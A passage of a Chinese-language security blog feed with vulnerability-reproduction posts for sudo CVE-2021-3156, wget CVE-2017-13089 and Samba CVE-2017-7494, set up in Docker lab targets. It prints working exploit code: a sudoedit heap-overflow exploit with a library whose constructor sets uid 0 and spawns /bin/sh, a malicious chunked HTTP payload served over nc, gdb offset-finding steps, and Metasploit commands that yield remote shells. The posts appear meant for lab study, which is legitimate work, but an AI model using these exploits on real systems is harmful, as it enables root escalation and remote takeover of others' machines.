punctuation">;</span>    <span class="token keyword">int</span> len<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token operator">+</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token operator">+</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>offset<span class="token operator">-</span>len<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        x<span class="token operator">--</span><span class="token punctuation">;</span>        y<span class="token operator">=</span>size<span class="token number">-1</span><span class="token operator">-</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>        len<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token operator">+</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> envoff<span class="token operator">=</span>offset<span class="token operator">-</span>len<span class="token number">-2</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,%d,%d\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span> Astring<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>y<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        Astring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">;</span>    Astring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\x00'</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"sudoedit"</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"-s"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>x<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\\"</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>Astring<span class="token punctuation">;</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\\"</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>envoff<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\\"</span><span class="token punctuation">;</span>    envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"X/test"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">setargv</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0x650</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">final</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/usr/local/bin/sudoedit"</span><span class="token punctuation">,</span>argv<span class="token punctuation">,</span>envp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><blockquote><p>2.lib.c</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] bl1ng bl1ng! We got it!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifndef</span> BRUTE</span>        <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span> <span class="token string">"PATH=/bin:/usr/bin:/sbin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>        <span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><blockquote><p>1.编译命令</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> libnss_Xgcc -fPIC -shared lib.c -o ./libnss_X/test.so.2gcc exp.c -o exp</code></pre><blockquote><p>2.提权</p></blockquote><pre class=" language-bash"><code class="language-bash">root@sudodebug:~/exp<span class="token comment" spellcheck="true"># su test</span>$ <span class="token function">whoami</span><span class="token function">test</span>$ ./exp11,121,1529<span class="token punctuation">[</span>+<span class="token punctuation">]</span> bl1ng bl1ng<span class="token operator">!</span> We got it<span class="token operator">!</span><span class="token comment" spellcheck="true"># whoami</span></code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220609171110.png" alt="image-20220609171110445"></p><h3 id="靶场二"><a href="#靶场二" class="headerlink" title="靶场二"></a>靶场二</h3><blockquote><p>1.docker pull ubuntu:18.04</p></blockquote><pre class=" language-bash"><code class="language-bash">root@ubuntu:/home/test/CVE<span class="token comment" spellcheck="true"># docker pull ubuntu:18.04</span>18.04: Pulling from library/ubuntuDigest: sha256:478caf1bec1afd54a58435ec681c8755883b7eb843a8630091890130b15a79afStatus: Image is up to <span class="token function">date</span> <span class="token keyword">for</span> ubuntu:18.04docker.io/library/ubuntu:18.04</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610134326.png" alt="image-20220610134319672"></p><blockquote><p>2.docker run -it -v /home/test/CVE:/root  ubuntu:18.04 /bin/bash</p></blockquote><p><code>实现容器内容数据与ubuntu 数据同步</code></p><pre><code>root@ubuntu:/home/test/CVE# lsCVE-2021-3156-plus  sources.list  sudo-1.8.21root@ubuntu:/home/test/CVE# docker run -it -v /home/test/CVE:/root  ubuntu:18.04 /bin/bashroot@1effa4fa41e6:/# cd root@1effa4fa41e6:~# lsCVE-2021-3156-plus  sources.list  sudo-1.8.21</code></pre><blockquote><p>3.docker cp sources.list 1effa4fa41e6:/etc/apt/</p></blockquote><p><code>容器内配置国内源 docker cp 本地文件路径 容器ID/容器NAME:容器内路径</code></p><pre class=" language-bash"><code class="language-bash">root@ubuntu:/home/test/CVE<span class="token comment" spellcheck="true"># docker cp sources.list 1effa4fa41e6:/etc/apt/</span></code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610135211.png" alt="image-20220610135211268"></p><p>参考链接：<a href="https://blog.csdn.net/m0_37605642/article/details/124331652">https://blog.csdn.net/m0_37605642/article/details/124331652</a></p><blockquote><p>4.apt-get update &amp; apt-get upgrade</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610135406.png"></p><p><code>ubuntu更新软件源报错： Certificate verification failed: The certificate is NOT trusted.</code></p><p><a href="https://blog.csdn.net/sinat_38800908/article/details/102839087?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-102839087-blog-106781676.pc_relevant_antiscanv3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-102839087-blog-106781676.pc_relevant_antiscanv3&amp;utm_relevant_index=1">https://blog.csdn.net/sinat_38800908/article/details/102839087?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-102839087-blog-106781676.pc_relevant_antiscanv3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-102839087-blog-106781676.pc_relevant_antiscanv3&amp;utm_relevant_index=1</a></p><blockquote><p>5.apt-get install gcc automake autoconf libtool make</p></blockquote><p><code>配置c环境</code></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610135842.png" alt="image-20220610135842786"></p><p><code>-bash: make: command not found的解决办法</code>：<a href="https://blog.csdn.net/qq_42684504/article/details/112872832">https://blog.csdn.net/qq_42684504/article/details/112872832</a></p><blockquote><p>6.安装sudo</p></blockquote><pre><code>./configure --prefix=/usr --libexecdir=/usr/lib --with-secure-path --with-all-insults --with-env-editor --docdir=/usr/share/doc/sudo-1.8.21 --with-passprompt=&quot;[sudo] password for %p: &quot; &amp;&amp; make &amp;&amp; make install &amp;&amp; ln -sfv libsudo_util.so.0.0.0 /usr/lib/sudo/libsudo_util.so.0</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610140007.png" alt="image-20220610140007903"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610140140.png" alt="image-20220610140140042"></p><p><code>sudo下载官网：</code><a href="https://www.sudo.ws/dist/">https://www.sudo.ws/dist/</a></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610140310.png" alt="image-20220610140310365"></p><blockquote><p>7.poc下载</p></blockquote><p>演示参考链接：<a href="https://payloads.online/archivers/2021-02-09/1/#0x03-%E6%BC%94%E7%A4%BA%E6%95%88%E6%9E%9C">CVE-2021-3156 - Exploit修改 « 倾旋的博客 (payloads.online)</a></p><p>POC链接：(<a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a>)</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610140548.png" alt="image-20220610140548324"></p><blockquote><p>8.演示</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610140310.png" alt="image-20220610140310365"><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610140918.png" alt="image-20220610140918050"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220610142515.png" alt="image-20220610142515239"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>下载软件包安装，sudo 1.9.5p2或最新版本。</p><p>sudo软件包下载地址：</p><blockquote><p><a href="https://www.sudo.ws/dist/">https://www.sudo.ws/dist/</a></p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/122676551?spm=1001.2014.3001.5502">https://blog.csdn.net/Breeze_CAT/article/details/122676551?spm=1001.2014.3001.5502</a></p><p>演示参考链接：<a href="https://payloads.online/archivers/2021-02-09/1/#0x03-%E6%BC%94%E7%A4%BA%E6%95%88%E6%9E%9C">CVE-2021-3156 - Exploit修改 « 倾旋的博客 (payloads.online)</a></p><p>POC链接：<a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">Rvn0xsy/CVE-2021-3156-plus: CVE-2021-3156非交互式执行命令 (github.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-13089(wegt栈溢出)</title>
      <link href="/2022/05/18/CVE-2017-13089-wegt%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2022/05/18/CVE-2017-13089-wegt%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>#背景</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>靶机：unbantu 16.0.4 Wget 1.19.1</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518164015.png" alt="image-20220518164015120"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.终端一 进入到 CVE-2017-13089目录中 运行<strong>nc -lp 6666 &lt;payload</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518165102.png" alt="image-20220518165102026"></p><p>注意此时payload 是这样</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518172809.png" alt="image-20220518172809744"></p><p>如果不是请用他覆盖payload文件内容</p><pre class=" language-xml"><code class="language-xml">HTTP/1.1 401 Not AuthorizedContent-Type: text/plain; charset=UTF-8Transfer-Encoding: chunkedConnection: keep-alive-0xFFFFF000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0</code></pre><p>2.终端二 运行 <strong>sudo gdb wget</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518165123.png" alt="image-20220518165123219"></p><p>4.终端二 运行<strong>disassemble skip_short_body</strong> 查看skip_short_body函数的地址块</p><p>0x000000000041ef0a &lt;+145&gt;:    call   0x404660 &lt;strtol@plt&gt;</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518165428.png" alt="image-20220518165428740"></p><p>5.终端二 在0x000000000041ef0a 打断点 *<em>b <em>0x000000000041ef0a</em></em></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518165704.png" alt="image-20220518165704410"></p><p>6.终端二 运行 <strong>r 127.0.0.1:6666</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518170055.png" alt="image-20220518170054969"></p><p>7.终端二 输入 <strong>n</strong>   (表示执行下一步)</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518170214.png" alt="image-20220518170214291"></p><p>8.开启终端三  在python 中运行<strong>hex(-0xfffff000&amp;0xfffffffffffffff)</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518170719.png" alt="image-20220518170719826"></p><p>9.终端二 一直执行n  知道只想fd_rea为止</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518171220.png" alt="image-20220518171220142"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518171309.png" alt="image-20220518171309842"></p><p>10.终端二 继续 <strong>x/32gx   0x7fffffffd810</strong></p><p>注意<strong>0x7fffffffd810</strong>每个人不一定一样。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518171544.png" alt="image-20220518171544072"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518171724.png" alt="image-20220518171724556"></p><p>11.终端二继续运行 n</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518180430.png" alt="image-20220518180430879"></p><p>12.终端二 运行<strong>x/32gx   0x7fffffffd810</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518180443.png" alt="image-20220518180443032"></p><p>13.终端二继续运行 n 直到到  <strong>=&gt; 0x41f0ed &lt;skip_short_body+628&gt;:    ret</strong>    </p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518180953.png" alt="image-20220518180953742"></p><p>13.终端二 运行<strong>distance 0x7fffffffd810  0x7fffffffda48</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518181201.png" alt="image-20220518181201040"></p><p><strong>注意</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518181347.png" alt="image-20220518181347410"></p><p>注意此时：终端二和终端一可以关闭退出之前运行。</p><p>14.在终端三 中打开payload.py修改</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518182124.png" alt="image-20220518182124317"></p><p>15.在终端三中运行修改后payload.py  <strong>python payload.py</strong></p><p>如果出现下图问题 运行<strong>pip install -U pwntools -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></strong></p><p>没有则跳过</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518182524.png" alt="image-20220518182524002"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518182857.png" alt="image-20220518182857420"></p><p>16.终端一 重新运行<strong>nc -lp 6666 &lt;payload</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518183104.png" alt="image-20220518183104656"></p><p>17.终端二重新运行 </p><p>1**.sudo gdb wget** </p><p>2.<strong>r 127.0.0.1:6666</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518183141.png" alt="image-20220518183141446"></p><p>18.终端三 运行<strong>nc 127.0.0.1 6324</strong> 拿到shell</p><p>输入whoami 测试</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518183307.png" alt="image-20220518183307765"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-7494（Linux永恒之蓝）</title>
      <link href="/2022/05/18/CVE-2017-7494%EF%BC%88Linux%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89/"/>
      <url>/2022/05/18/CVE-2017-7494%EF%BC%88Linux%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518110320.jpg" alt="a"></p><p>漏洞背景：Samba是在Linux和UNIX系统上实现SMB协议的一个软件，2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>漏洞编号CVE-2017-7494，漏洞影响了🖊Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本🖊，确认属于严重漏洞，可以造成远程代码执行。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>靶机：Unbantu 16.0.4(s)<strong>开启445端口 samba 4.6.3</strong> 采用docker 搭建vulhub靶场 </p><p>vulhub 搭建参考：<a href="https://hexofox.gitee.io/2022/05/17/Docker/">Docker | FSRM (gitee.io)</a></p><p>1.进入vulhub 目录中找到samba</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/202205181006108.png" alt="image-20220518100610940"></p><p>2.进入samba 目录 执行 <strong>sudo docker-compose up -d</strong>  搭建环境</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/202205180931746.png" alt="image-20220518093136684"></p><h2 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h2><p>攻击机：kali-2022  msf</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/202205180933537.png" alt="image-20220518093346463"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="靶机准备"><a href="#靶机准备" class="headerlink" title="靶机准备"></a>靶机准备</h2><p>1.首先查看docker 中samba是否开启  <strong>sudo docker ps</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/202205180943775.png" alt="image-20220518094350707"></p><p>如果没有开启运行 <strong>sudo  docker start cve-2017-7494_samba_1</strong>  </p><p>sudo docker ps 查看正在运行 容器</p><p>sudo docker ps -a 查看所有运行过容器记录</p><p>sudo docker start  容器名字  运行容器</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518103904.png" alt="image-20220518103904308"></p><p>2.查看 ip地址 <strong>ifconfig</strong>  192.168.236.130</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/202205180949658.png" alt="image-20220518094913603"></p><h2 id="攻机-准备"><a href="#攻机-准备" class="headerlink" title="攻机 准备"></a>攻机 准备</h2><p>0.运行 <strong>nmap -A -O  192.168.235.130</strong> 查看靶机开启端口</p><p>nmap -A -O 目标ip</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518105055.png" alt="image-20220518105055561"></p><p>1.运行msfconsole</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518104012.png" alt="image-20220518104012039"></p><ol start="2"><li>use exploit/linux/samba/is_known_pipename</li></ol><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518104042.png" alt="image-20220518104042639"></p><p>3.配置靶机IP和端口</p><p><strong>set rhosts 192.168.235.130 设置主机ip</strong></p><p><strong>set rport 445  端口号</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518104439.png" alt="image-20220518104439150"></p><p>4.设置SMB </p><p><strong>set SMB::AlwaysEncrypt false</strong></p><p><strong>set SMB::ProtocolVersion 1</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518104516.png" alt="image-20220518104516174"></p><p>参考链接：<a href="https://blog.csdn.net/weixin_43376075/article/details/115558463">https://blog.csdn.net/weixin_43376075/article/details/115558463</a></p><p>5.run  拿下shell</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518104631.png" alt="image-20220518104631077"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全的路很长，致迷茫的你</title>
      <link href="/2020/11/09/%E5%AE%89%E5%85%A8%E7%9A%84%E8%B7%AF%E5%BE%88%E9%95%BF%EF%BC%8C%E8%87%B4%E8%BF%B7%E8%8C%AB%E7%9A%84%E4%BD%A0/"/>
      <url>/2020/11/09/%E5%AE%89%E5%85%A8%E7%9A%84%E8%B7%AF%E5%BE%88%E9%95%BF%EF%BC%8C%E8%87%B4%E8%BF%B7%E8%8C%AB%E7%9A%84%E4%BD%A0/</url>
      
